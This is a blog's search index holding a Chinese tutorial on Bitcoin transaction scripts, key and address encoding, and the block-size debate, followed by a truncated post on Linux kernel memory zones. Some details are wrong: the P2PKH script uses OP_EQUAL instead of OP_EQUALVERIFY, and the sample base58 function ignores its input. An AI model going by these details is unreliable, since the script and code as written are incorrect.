<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BTC隔离见证升级-1</title>
      <link href="/2023/12/23/B01_btcSEGWIT/"/>
      <url>/2023/12/23/B01_btcSEGWIT/</url>
      
        <content type="html"><![CDATA[<p>​2008年10月31日，中本聪（Satoshi Nakamoto）发布了一篇名为《比特币：一种点对点的电子现金系统》（Bitcoin: A Peer-to-Peer Electronic Cash System）论文，详细阐述了比特币的理念和技术细节。随后，2009年1月3日，中本聪挖出了比特币网络的创世区块，标志着比特币的诞生。</p><p>​比特币自诞生后，吸引了众多计算机，金融领域的人士参与。随着比特币的不断传播，围绕比特币生产交易的芯片、集成电路、交易所、钱包、应用软件等蓬勃发展，这也使得比特币和一众加密货币渐渐走向大众视野。除了比特币的生产和交易，人们也开始尝试在比特币网络上开发更多能够使用在实际生活中的应用，但是遇到了比特币区块链网络本身的技术瓶颈。因为在区块链分布式系统设计中，难以同时满足去中心化、安全性和可扩展性。而相比可扩展性，去中心化和安全性是被人们普遍认为是更重要的特性，因此在不牺牲比特币网络的去中心化和安全性的前提下，如何增加可扩展性变成了比特币技术突破的重点探索方向。</p><p>​比特币发展至今，经历过两次重大的技术升级，也正是这两次升级为今天比特币生态繁荣打下了基础。第一次是<strong>隔离见证升级（Segregated Witness，SEGWIT）</strong>，第二次则是<strong>Taproot升级</strong>，本篇文章着重分析一下隔离见证升级的整个过程。</p><blockquote><p>阅读本篇文章所需前置知识：区块链基础知识，<strong>比特币UTXO账户模型</strong></p><p>很棒的区块链入门视频：<a href="https://www.bilibili.com/video/BV1Vt411X7JF/">北京大学肖臻老师《区块链技术与应用》公开课</a></p><p>推荐阅读材料：<a href="https://books.oktangle.com/masterbtc/cn-preface.html">《精通比特币第二版》</a></p></blockquote><p><img src="https://s2.loli.net/2023/12/27/oNVUulijx6EWvyG.png" alt="image.png"></p><h1 id="一-经典交易脚本（P2PK-P2PKH-P2SH"><a href="#一-经典交易脚本（P2PK-P2PKH-P2SH" class="headerlink" title="一. 经典交易脚本（P2PK,P2PKH,P2SH)"></a>一. 经典交易脚本（P2PK,P2PKH,P2SH)</h1><p>​众所周知，比特币系统是采用UTXO（Unspent Transaction Output，未花费交易输出）模型进行记账，因此在一笔交易中需要包含Inputs和Outputs，作为该笔交易的资金来源和资金去向。</p><h2 id="P2PK（Pay-to-public-key）"><a href="#P2PK（Pay-to-public-key）" class="headerlink" title="P2PK（Pay to public key）"></a>P2PK（Pay to public key）</h2><p>​对于最简单的P2PK（Pay to public key），假若有两笔转账，A-&gt;B一笔交易，记作Tx1；B-&gt;C一笔交易，记作Tx2。这两笔交易中都包含Inputs和Outputs部分。其中Outputs中的 Script 就是 “锁定脚本”，其中包含接收者的公钥，它用来保证只有接受地址的所有者才能花费这个输出。而Inputs中的 Script 也就是 “解锁脚本”，它是用来打开锁定脚本的钥匙，以证明该笔UTXO属于我。比特币转账时，会将本交易的Inputs脚本和其引用的交易的Outputs脚本拼接在一起并执行检查。请注意：是<strong>“本交易的Inputs脚本和其引用的交易的Outputs脚本”</strong>，不是<strong>“本交易的Inputs脚本和本交易的Outputs脚本”</strong>！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input script: PUSHDATA(Sig)</span><br><span class="line">output script : PUSHDATA(PubKey)  OP_CHECKSIG</span><br></pre></td></tr></table></figure><p>​注意，input script给出的签名是本人的签名，而output script中给出的PubKey是收款人的PubKey。因此，在上面例子的Tx2中，需要将<strong>Tx2的input script</strong>，也就是PUSHDATA(Sig_B) 和 <strong>Tx1的output script</strong>，也就是PUSHDATA(PubKey_B)  CHECKSIG 拼接并执行。如果执行成功，则说明Tx2这笔交易确实是B本人发出的，他有权利花费Tx1里A转给他的那笔“未花费交易输出（UTXO）”。</p><p>​脚本的执行过程就很简单了，这是一个简单的栈语言，CHECKSIG代表弹出栈顶两个元素并检查签名和公钥是否可以对上。<img src="https://s2.loli.net/2023/12/26/DYBuyvSFU2r8h9o.jpg" alt="FCI7_RU37_FA1I0AV~0669X_tmb.jpg"></p><h2 id="P2PKH（Pay-to-Public-Key-Script）"><a href="#P2PKH（Pay-to-Public-Key-Script）" class="headerlink" title="P2PKH（Pay to Public Key Script）"></a>P2PKH（Pay to Public Key Script）</h2><p>​P2PK确实看起来不错，并且够简洁，但实际上比特币区块链从一开始就没使用P2PK交易账单形式，而是：Pay-To-Public-Key-Hash（P2PKH），如下，它相比于P2PK的账单形式更加强了一步，或者说，安全程度更高些：<img src="https://s2.loli.net/2023/12/23/7GByIeLCSkn6Yzw.png" alt="image.png"></p><p>​输出中的 Public Key Script 字段（下文简称为 “scriptPubKey”）就是 “锁定脚本”，其中包含接收者的公钥哈希，它用来保证只有接受地址的所有者才能使用这个支出。输入中的 Signature Script 字段（下文简称为 “scriptSig”）也就是 “解锁脚本”，它是用来打开锁定脚本的钥匙，以证明该笔UTXO属于我。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Inputs)ScriptSig= &lt;Signature&gt; &lt;Public Key&gt;</span><br><span class="line">(Outputs)ScriptPubKey= OP_DUP OP_HASH160 &lt;Public KeyHash&gt; OP_EQUAL OP_CHECKSIG</span><br></pre></td></tr></table></figure><p><img src="https://img.learnblockchain.cn/2021/08/26/8f49078724304e2989e6b021a9af518f.gif" alt="8f49078724304e2989e6b021a9af518f.gif (700×196) (learnblockchain.cn)"></p><p>​比如小明打给我一笔钱，在Outputs中，会给出收款人（也就是我）的公钥哈希，而在我收到这笔款之后，如果我要花费它（我想转给小红），那么会将我花费这笔的账单的Inputs和上一笔转给我钱的账单Outputs拼接在一起并检查。首先 我的签名<Signature>和我的公钥<Public Key>压入栈。然后OP_DUP是复制公钥<Public Key>，OP_HASH160 则将刚刚复制出来的公钥进行HASH160运算，再将之前UTXO中给的<Public KeyHash>压入栈，OP_EQUAL 则是检查栈顶的两个公钥哈希是否一样。<strong>请一定注意，靠近栈顶的公钥哈希是UTXO里给出的（即 小明-&gt;我 账单里Outputs里的），它代表着这笔钱的归属者是我；而靠近栈底的那个公钥哈希是 我-&gt;小红 这笔账单里给出的我自己公钥通过哈希运算得到的。</strong>最后一步，依然是检查签名和公钥是否可以对上，若是，则成功。</p><blockquote><p>可能有同学有疑问：众所周知椭圆曲线加密（ECDSA）算法足够安全，即人们无法通过公钥反推出私钥，这也正奠定了区块链密码学的底层基础之一。既然这样，P2PK脚本已经足以支撑起比特币的交易系统安全性，那为什么还要用更复杂的P2PKH呢？</p><p>在这个问题里，有几个答案都给出了他们自己的看法，可以参考一下：<a href="https://bitcoin.stackexchange.com/questions/72184/why-is-p2pkh-used-instead-of-the-simpler-p2pk">Why is P2PKH used instead of the simpler P2PK?</a></p><p>大概总结一下，或有以下几点原因：</p><ol><li>公钥太长，而经过哈希压缩后会更短。（A public key is 65 bytes long (0x04 + 64 bytes public key) or 33 bytes when compressed (0x02 | 0x03 + 32 bytes public key)。（但其实从整个占用区块链空间大小来看，P2PKH还是会更大的，因为P2PKH的input script也会提供公钥😂）</li><li>椭圆曲线加密算法（ECDSA）如果被未来的量子计算机破解，那么P2PK系统会崩溃，但是加一层 <Public KeyHash> 则会更安全。</li><li>P2PKH下Outputs里并不会暴露收款人公钥，只有自己发起转账时才会暴露公钥，更加安全。（虽然假设ECDSA算法足够安全下，暴露公钥也没有影响）</li></ol><p>所以实际上看，中本聪这样设计的目的，也是为了在椭圆曲线算法的基础上，再增加了一层哈希以保证安全。</p></blockquote><p>​在比特币中，1开头的地址类型就是使用的P2PKH方式，这也是最原始的比特币地址设计方案，例如：<a href="https://www.blockchain.com/explorer/transactions/btc/3184aa6ccaed5f3e41fc34045970cee7501b68795c235108debd1c9a5dfec1a4">交易账单3184aa6ccaed5f3e41fc34045970cee7501b68795c235108debd1c9a5dfec1a4</a>。目前所有钱包均支持该地址类型，但同样的，这种地址类型的转交易手续费（gas）也是最高的，具体原因下文有进一步分析。</p><h2 id="P2SH（Pay-to-Script-Hash）"><a href="#P2SH（Pay-to-Script-Hash）" class="headerlink" title="P2SH（Pay to Script Hash）"></a>P2SH（Pay to Script Hash）</h2><p>​2012年，比特币改进提案<a href="https://github.com/bitcoin/bips/blob/master/bip-0016.mediawiki">BIP16</a>（Bitcoin Improvement Proposals，BIP）提出P2SH脚本方案，也就是向赎回脚本转账的支付方案。在之前提到的P2PKH中，如果我要向小红转一笔账，那么我需要在该账单的Outputs中提供小红的公钥哈希，当小红需要把这笔钱转给其他人时，再提供她自己的公钥以及私钥签名来解锁该笔钱用于支付。</p><p>​而P2SH的方案则是将 <strong>“向公钥哈希支付”</strong> 转为了 <strong>“向脚本哈希支付”</strong>，换句话说，小红需要事先准备好一段脚本，称为“赎回脚本”，并将它哈希化，如果我要向小红转一笔账，那么我需要在该账单的Outputs中提供小红的赎回脚本哈希值。以后，若小红想花这笔钱，则需要在Inputs中提供私钥签名以及该赎回脚本本身。系统会进行两步检测，首先会检测小红Inputs中提供的赎回脚本经过哈希化之后是否能和她要花的那笔钱的Outputs里赎回脚本哈希对上。下一步再执行赎回脚本里的内容，如果也能执行成功，则整个账单验证成功。有人将这种方式比喻成：支付方式由简单的提供公钥转换成了提供一段智能合约（因为赎回脚本可以任意编写）。</p><p>​例如，下面一段程序里，就将 OP_CHECKSIG 的操作写进了赎回脚本里。执行过程：OP_HASH160操作先将栈顶的<serialized redeemScript>转换成<redeemScriptHash>，然后OP_EQUAL检查栈顶的两个赎回脚本哈希是否相等，相等则进入redeemScript的执行：<PubKey> 入栈，OP_CHECKSIG检查栈顶的<Signature>和<PubKey>是否能对上，若能，运行成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inputs Script = &lt;Signature&gt; &lt;serialized redeemScript&gt;</span><br><span class="line">Outputs Script = OP_HASH160 &lt;redeemScriptHash&gt; OP_EQUAL</span><br><span class="line"></span><br><span class="line">redeemScript = &lt;PubKey&gt; OP_CHECKSIG</span><br></pre></td></tr></table></figure><p>​单从这个例子来看，赎回脚本又像是多此一举。然而历史告诉我们，从支付公钥哈希到支付脚本哈希，是比特币历史上重要的一步，它为用来实现更为复杂的交易提供了可能，增加了比特币的可编程货币的特性。P2SH 最知名的一个应用就是来实现<strong>多重签名</strong>。就像前面讨论过的，如果接收者在赎回脚本中添加适当的转出条件，就可以把脚本哈希变成一个多重签名地址，比特币一旦转入这个地址就需要多个数字签名才能转出。多重签名机制使得比特币发展支付通道和闪电网络成为可能，而这些都离不开 P2SH 机制。下面简单讲一下多重签名机制：</p><p>​若三人合伙创业开公司，接受比特币支付，并且规定，所有对外转账都需要三个人一起签名才能成功，这就需要用到多重签名。早期的多重签名可以直接使用P2PKH实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//对外转账时提供三人的签名及公钥</span><br><span class="line">(Inputs)ScriptSig= .. &lt;Signature1&gt; &lt;Signature2&gt; &lt;Signature3&gt; ...</span><br><span class="line"></span><br><span class="line">//接受支付时也需要三人的公钥哈希</span><br><span class="line">//OP_CHECKMULTISIG可验证多个签名</span><br><span class="line">(Outputs)ScriptPubKey= ...M &lt;Public KeyHash1&gt; &lt;Public KeyHash2&gt; &lt;Public KeyHash3&gt; N OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure><p>​这样有一个很不方便的地方：若我要给该公司转账，我就需要去拿他们三个人的公钥哈希并写入我的交易Outputs里，并且，这导致我给他们转账的账单size特别大，这会花费我更多的gas。但是赎回脚本的出现让这一切都简单了很多，我只需要知道赎回脚本的哈希就行，至于赎回脚本具体内容是什么则与我无关，在P2SH 支付中，复杂的锁定脚本被电子指纹所取代，电子指纹就是指密码学中的哈希值。例如，未来公司新增了两位合伙人，那么公司只需要在赎回脚本里再加两个人，然后把新的赎回脚本哈希发给我就行，我则无需再在Outputs里增加两个人的公钥哈希。而这也使得赎回脚本的大小导致给矿工的交易费用增加从发送方转移到收款方。在比特币区块链中，以3开头的地址有一部分就是P2SH方式，例如<a href="https://www.blockchain.com/explorer/transactions/btc/abf327a94ef9d508e4e2062b692f6a990604377f388868ea14da760dfbdec8ac">交易abf327a94ef9d508e4e2062b692f6a990604377f388868ea14da760dfbdec8ac</a>。需要注意的是，假如你向一个无效的赎回脚本转账，该笔交易仍然会成为有效账单，但是这笔钱将永远无法被花出去，并且也会一直记录在UTXO里。在比特币地址里，以3开头的地址类型通常就是P2SH脚本方式。</p><h1 id="二-私钥，公钥和地址"><a href="#二-私钥，公钥和地址" class="headerlink" title="二. 私钥，公钥和地址"></a>二. 私钥，公钥和地址</h1><p>​或许大家有疑问，在转账时我们只提供了对方的地址，P2SH是如何获得对方赎回脚本哈希的呢？</p><p>​其实，我们需要知道私钥，公钥，公钥哈希和地址的关系，整个转换过程分为四步：</p><p><img src="https://s2.loli.net/2023/12/30/iQGjOC5umRnH8dE.png" alt="image.png"></p><ol><li><p>伪随机数源生成私钥。</p></li><li><p>私钥通过加密算法（椭圆曲线加密）生成公钥，这一步是<strong>单向</strong>的，也就是说公钥无法反推出私钥。</p></li><li><p>公钥通过SHA256和RIPEMD160两步哈希压缩得到公钥哈希，这一步同样是<strong>单向</strong>的，因为哈希运算不可逆。</p></li><li><p>公钥哈希通过Base58编码得到地址。请注意这一步是<strong>双向</strong>的，也就是说，通过地址可以反推出公钥哈希。</p></li></ol><p><img src="https://s2.loli.net/2023/12/30/q5tpXANivlmMbhD.png" alt="image.png"></p><p>​因此，我们将赎回脚本哈希通过Base58进行编码得到的地址，也可以通过逆向运算得到赎回脚本哈希。其中最后一步，也就是从公钥哈希或赎回脚本哈希到地址这一步，其中利用了base58编码。</p><p>​以前我遇到过这种情况，某次我向链上某个地址转账的时候，故意修改了该地址的某一个字母，于是得到报错：该地址不存在。当时我还有疑问，既然私钥是随机生成的，那么得到的公钥，以及公钥得到的地址按理来说应该也是随机的，那为什么自己随意修改的地址却是错误的呢。其实这里面就涉及到公钥哈希到地址的转换问题。</p><p>​在比特币中，出于使数据紧凑、易于阅读且易于检测错误等原因，公钥哈希会以经过一系列编码转换得到地址，然后呈现给用户。这其中就包括类似于计网里的错误码校验以及base58编码。</p><p>​首先，为了区分不同的公钥格式，数据前会首先添加一个版本前缀（例如，P2PKH版本前缀为0x00，P2SH为0x05），接着，这部分数据会经过两次SHA256哈希运算，然后将得到的数据取首4个字节作为校验码添加至原数据末端，接着再将整体数据（版本前缀 + 公钥哈希 + 校验码）通过base58编码得到最终的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">校验和 = SHA256(SHA256(前缀||数据))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/15/Rrj1np92SQXvPbi.png" alt="image.png"></p><p>​base58编码表包括9个数字（1-9），25个小写字母（没有 l ），24个大写字母（没有O，I），出于防止视觉混淆的原因，缺少四个编码（0，l，O，I）。base58编码算法如下。因此，由于版本前缀的原因，我们可以轻松根据地址结果前缀分析脚本类型了。同样，通过将地址结果base58解码，再去掉版本前缀和校验码，也就能得到对应的公钥哈希了。这样的好处显而易见，有了校验和的存在，若转账地址由于马虎输错其中一位，得到的地址是无效的，杜绝了不必要的损失。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base58_encode</span>(<span class="params">hex_string</span>):</span><br><span class="line">    hex_string = <span class="string">&#x27;051234567890abcdef1234567890abcdef12345678abcd1234&#x27;</span></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为大整数</span></span><br><span class="line">    num = <span class="built_in">int</span>(hex_string, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Base58字符集</span></span><br><span class="line">    alphabet = <span class="string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 大整数转Base58字符串</span></span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">        num, rem = <span class="built_in">divmod</span>(num, <span class="number">58</span>)</span><br><span class="line">        result = alphabet[rem] + result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>​值得注意的是，比特币中，私钥也有base58编码格式：一个普通的私钥是256个二进制位的数字，即64位的十六进制串（例如<code>0xb1de9a3002a8b4b4238ddde67e4f58bff0a2a8cae173e3eab32da2137cddad85</code>），长度为32字节，编码流程和上述流程相同，私钥的前缀是0x80，通过两步SHA256得到校验码，再取校验码前四位拼接，然后就得到了WIF格式（Wallet Import Format，钱包导入格式）的私钥，这样的私钥总是以5开头，例如：<code>5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ</code>，这样的私钥也被称为非压缩WIF格式私钥。与其对应的是压缩WIF格式的私钥，压缩私钥格式会在32字节的原始私钥前后各添加一个<code>0x80</code>字节前缀和<code>0x01</code>字节后缀，共34字节的数据，对其计算4字节的校验码，附加到最后，一共得到38字节的数据，接着进行base58编码，最终得到以 K 或者 L 开头的私钥，例如：<code>KwdMAjGmerYanjeui5SHS7JkmpZvVipYvB2LJGU1ZxJwYvP98617</code>。如今的钱包已经几乎全部使用压缩WIF格式的私钥了。值得注意的是，“压缩私钥”指的并不是私钥本身被压缩，从前面的生成流程也可以看到，压缩私钥区别仅仅在于在原始私钥后多加了一个0x01的后缀，而其中具体原因还得牵扯到公钥格式。</p><p>​在椭圆曲线生成算法中，K &#x3D; k * G，k是私钥，而公钥K是椭圆曲线上的一个坐标，可以表示为 K &#x3D; (x, y)，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = F028892BAD7ED57D2FB57BF33081D5CFCF6F9ED3D3D7F159C2E2FFF579DC341A</span><br><span class="line">y = 07CF33DA18BD734C600B96A72BBC4749D5141C90EC8AC328AE52DDFE2E505BDB</span><br></pre></td></tr></table></figure><p>​传统的非压缩公钥格式表示为 前缀（0x04） + x（<code>F028892BAD7ED57D2FB57BF33081D5CFCF6F9ED3D3D7F159C2E2FFF579DC341A</code>） + y（<code>07CF33DA18BD734C600B96A72BBC4749D5141C90EC8AC328AE52DDFE2E505BDB</code>），即<code>04F028892BAD7ED57D2FB57BF33081D5CFCF6F9ED3D3D7F159C2E2FFF579DC341A07CF33DA18BD734C600B96A72BBC4749D5141C90EC8AC328AE52DDFE2E505BDB</code>。由于公钥是椭圆曲线上的一个点（x，y），因此，如果我们知道 x 坐标，就可以通过求解方程来计算 y 坐标 y^2 mod p &#x3D;（ x3 + 7 ）mod p，因此公钥无需在存储 x 的同时再存储 y。所以压缩公钥便应运而出：压缩公钥的前缀为0x02或者0x03，这是因为 y^2使得y可能为正值或者负值。这样一来，我们仅通过一个 x 坐标即可推导出完整坐标。例如，上述例子里的压缩公钥格式即为 前缀 + x，即<code>03F028892BAD7ED57D2FB57BF33081D5CFCF6F9ED3D3D7F159C2E2FFF579DC341A</code>。压缩公钥非常重要，因为前文提到，在自己发布交易时，需要在输入脚本里添加自己的公钥，因此，压缩公钥可以大大节省其空间以节省gas。然而，当我们使用双散列函数（ RIPEMD160（SHA256（K） ）将此压缩公钥转换为比特币地址时会发现，压缩公钥和非压缩公钥会生成两个不同的比特币地址。这可能会造成混淆，因为这意味着单个私钥可以产生以两种不同格式（压缩和未压缩）的公钥，这两种格式的公钥会产生两个不同的比特币地址，但是，两个比特币地址的私钥却是相同的。因此，为了不造成混乱，我们人为地将压缩公钥和非压缩公钥对应的私钥也区分开来，这也就说明了压缩私钥的由来。</p><h1 id="三-比特币扩容之争"><a href="#三-比特币扩容之争" class="headerlink" title="三. 比特币扩容之争"></a>三. 比特币扩容之争</h1><p>​时间来到了2017年，比特币因为扩容方案的分歧，迎来了一次历史性的硬分叉分级。</p><p>​比特币规定每10分钟（左右）挖出一个大小为1MB的区块，每笔交易平均250字节，每个区块则大概能处理4000笔交易，计算得到比特币每秒约能处理7笔交易。相比于每秒动辄数十万笔量级的支付宝等交易系统，显然这样的处理速度相当慢的，因此，比特币需要扩容，几乎成为业界的共识和期望。或许大家有疑问：这是一件很困难的事情吗？为什么比特币规定每十分钟出一个块呢，改成半分钟不行吗？为什么规定区块大小只能是1MB呢，改成1GB又有什么问题？</p><p>​其实，这是区块链的可扩展性（scalability）问题，至今仍旧是一个学术难题。比特币采用的POW（工作量证明）的共识算法，这建立在全球不能有单个节点掌握51%以上的算力，否则会造成安全危机，但是这有个很重要的前置条件：那就是，所有节点得是在公平竞争才行。我们把挖矿的过程比作考试——老师给所有人发卷，一旦班级某位同学写完该试卷，老师就会开始分发新试卷，其他所有人也需要立即开始做新试卷，因为只有第一位做完某张试卷的同学会才得到奖励。</p><p>​但是，比特币的网络是有异步性的，换句话说，某位同学完成试卷后，新试卷并不是一瞬间发到所有同学手上，而是需要通过全球所有节点的一步步转发并广播出去。比特币的网络需要至少半分钟才能将挖到的新区块消息扩散到全球所有节点，换句话说，最早拿到新试卷的人比最晚拿到的人早半分钟开始作答。但是，大家觉得这样也没什么问题——第一，每轮先拿到试卷的人几乎是随机的，也很公平。第二，考试的时间设定为10分钟，大家觉得这半分钟的延迟可以接受。</p><p>​然而，如若考试时间只有半分钟呢？又或者，如果发卷速度特别慢呢？</p><p>​我们知道，比特币中若两个节点几乎同时挖到新区块的话，链就会出现分叉，而最终只有一条链会被所有人所接受，而被遗弃的那条链上所投入的算力就被浪费了。那如果考试时间只有半分钟，意味着有人可能还没收到新试卷，更新的试卷又开始分发了，整个网络会出现大量的孤块和分叉，实际上比特币的安全模型就崩塌了。大家仔细想一下，我们这里比喻成 老师为大家发放新试卷 实际上是不贴切的，分布式网络里没有老师。为什么区块链中必须要某个区块挖出后，才能挖新区块呢，其实是因为比特币中每个区块中都需要包含上一个区块的哈希值，它是环环相扣的。也就是说，当我做完该试卷后，一方面我会立即把我做完试卷的消息发散出去，因为我希望所有人都能接受我是第一个做完这张试卷的人的事实，另一方面我就会马上开始做新试卷了。</p><p>​挖到新区快的消需要半分钟才能传遍全球，这就意味着，平均下来，每个节点，在这十分钟内，平均有15秒的时间其实是在做旧试卷，这个时间其实是被浪费了的。15秒钟在十分钟的尺度下或许不算大，但是如果把出块时间改成半分钟呢？大家就会马上发现问题——节点们有一半的时间都在做旧试卷！那假如我挖到个新区块，但是我不公布，我继续在这个区块后面挖，然后再挖出一个，还不公布再继续挖，直到我挖到很长的时候再一口气公布出来。在理想的比特币模型中，除非我掌握的算力超过50%，否则这样做只会导致我自己链的延长速度跟不上其他所有人的链延长速度，但是如果半分钟出一个块，理论上我只需要掌握33%的算力就有可能达成目标，因为区块链中大家有一半的算力都在做错误的试卷，而我是一直在我自己这条链上挖，相当于一直在做正确的试卷。</p><p>​如此一看，很显然，区块链的安全性就降低了很多。 而增加区块大小也同理。如果把区块大小扩大到1GB，网络传输所需的时间也会相应提高，比特币的安全性也会降低。在<a href="https://link.zhihu.com/?target=http://fc16.ifca.ai/bitcoin/papers/CDE+16.pdf">On scaling decentralized blockchain</a> 这篇论文里指出，在现行互联网中，如果十分钟产生一个区块的话，区块大小不能超过4MB。当然，比特币当时规定的区块大小为1MB，这显然在安全范围内。</p><p>​从2015年5月到2017年11月，比特币扩容战争历时两年半，其中牵扯到比特币开发者，矿工，投资者，社区等多方利益纠缠，其中的背景就是：随着比特币交易数量增多，原来设计的1MB区块越来越无法满足大家的交易需求，这导致gas费不断飙升，转账延迟不断加大，进一步导致大家渐渐从BTC付款转向ETH，XRP等其他公链。在这场战争中主要有两派观点，其一就是支持区块扩容派：他们的逻辑非常简单，区块的扩容能直接带来交易打包量的提升，并且能迅速实施起来。反对派则是支持隔离见证技术对区块链进行改造（下文我们会提到，隔离见证技术也能够增加单个区块的交易数），他们的原因包括：大区块会减少全节点数量进而降低系统抗审查能力，区块扩容所需的硬分叉风险太大，隔离见证技术能够促进未来闪电网络，侧链等技术的发展等等。</p><p>​那么，究竟什么是隔离见证技术呢？这部分从源码来看较为复杂，我们在下一章里再详细讲解。</p><hr><h2 id="疑问解答"><a href="#疑问解答" class="headerlink" title="疑问解答"></a>疑问解答</h2><ol><li><p>比特币网络每秒真的只能处理七笔交易吗，那交易所里为什么还挺快的？</p><p>因为我们大部分交易都是在中心化交易所进行，中心化的交易所手里掌握了很多比特币，但是他们对我们的账户做了上层的抽象。换句话说，当我在中心化的交易所里对小红发起一笔比特币转账时，交易所并不需要真正在比特币链上发起一笔交易，它只需要在交易所的数据库里减去我的余额然后给小红加上即可，这也说明了为什么我们在交易所内交易时并不需要支付gas费（但有时候需要支付手续费，注意这个手续费不是给矿工的，而是交易所自行收取的）。而只有我们想要把在交易所里的币提到外部私有地址的时候，才需要上链，这时也就需要付gas费了。此外，比特币后续发展出的闪电网络等技术也减少了链上交易的频率。</p></li><li><p>比特币扩容战争始末资料：<a href="https://m.jiemian.com/article/3334359.html">比特币扩容之争始末</a>。</p></li><li><p>龙年福利：凭借向该地址<code>0xf5741aadb9fdccaf748683ef1042deed6791d887</code>转入1USDT的截图，可以到我这免费领取一句谢谢😊😊😊</p><p><img src="https://s2.loli.net/2023/12/30/jHnM6SGAU9ekQqu.jpg" alt="eb7c23e35d5bba12d19842b1334dbeb.jpg"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Block Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux虚拟内存解析 - 内核空间</title>
      <link href="/2023/09/12/O05_virtual_mem_2/"/>
      <url>/2023/09/12/O05_virtual_mem_2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在之前[Linux虚拟内存解析 - 用户空间(chaceq.love)]这篇文章里，我们了解了Linux虚拟内存的用户空间布局，在32位系统下，低地址的3GB被划分成每个进程独享的用户地址空间，而高地址的1GB被划分成所有进程共享的内核地址空间。那么这1GB的内核地址空间又是如何布局的？此外，我们在之前还提到用于描述进程的进程控制块task_struct，又是存储在什么位置的呢？这一章或许能够让这些问题得以解答。</p></blockquote><h2 id="内核空间概述"><a href="#内核空间概述" class="headerlink" title="内核空间概述"></a>内核空间概述</h2><p>​我们都知道，32位系统下，虚拟内存的高地址1GB空间会被作为所有进程共享的内核内存空间，也就是0xC000 000 - 0xFFFF FFFF这段地址空间，本篇文章也就是讨论在32位系统下的这部分空间布局情况。<img src="https://s2.loli.net/2023/09/11/yJs1GRUXtocarvk.jpg" alt="kernel.jpg"></p><p>​首先，为什么有用户空间和内核空间之分？因为，在 CPU 的所有指令中，有些指令是非常危险的，如果错用将导致系统崩溃，比如清内存、设置时钟等。所以对于那些危险的指令，只允许操作系统及其相关模块使用，普通应用程序只能使用那些不会造成灾难的指令。对系统资源的管理等操作都是在内核空间完成的，比如读写磁盘文件，分配回收内存，从网络接口读写数据等等。对于 Linux 来说，通过区分内核空间和用户空间的设计，隔离了操作系统内核代码与应用程序代码（操作系统的代码要比程序员写的应用程序代码健壮很多）。即便是单个进程崩溃也不会影响到整体操作系统的稳定性，这样其它的程序还可以正常运行。</p><p>​Linux在发展过程中，随着硬件设备的更新和技术水平的提高，其内核空间布局情况也是一直以一种不断打补丁并向前兼容的方式发展。这样的后果就使得内核空间有几个区域，而且在不同的区域具有不同的映射方式，同时这也可以解释为什么Linux会有这些不同的分区。通常，<strong>Linux内核空间可以被分成三个区域，即DMA区（ZONE_DMA）、普通区（ZONE_NORMAL）和高端内存区（ZONE_HIGHMEM）</strong>。</p><p>​早期计算机实际配置的物理内存通常只有几MB，而虚拟内核内存1GB的空间显然大得多，所以为了提高内核通过虚拟地址访问物理地址内存的速度，采用了一种从低地址向高地址依次一一对应的固定映射方式，如下图所示</p><p><img src="https://s2.loli.net/2023/09/11/thxM49QmwvziX35.png" alt="image.png"></p><p>​可以看到，这种固定映射方式使得虚拟地址与物理地址的关系变得很简单，几乎就像是直接使用物理地址，只需要一个固定的偏移量PAGE_OFFSET就能完全虚拟地址和物理地址的转换，相比使用页表查找的方式要快得多！因此，这块一一映射的内核区域也叫做线性映射区或直接映射区。</p><p>​可随着计算机硬件的发展，问题随之而来。虚拟内核内存总共只有1GB的地址空间，一旦装配的物理内存超过了1GB，那内核空间便无法访问到全部物理内存空间，因此Linux的做法便是：分区。将内核空间前896MB的空间作为线性映射区，因此最多能线性访问到896MB的物理内存。而将剩下的128MB虚拟内存空间设置为动态内存分配方式，这样，这块虚拟内存也就可以动态映射所有的物理内存空间了！而这块128MB的内存空间也被称为高端内存区（ZONE_HIGHMEM）。如下图所示<img src="https://s2.loli.net/2023/09/11/MhjixR7Hw62Q15e.png" 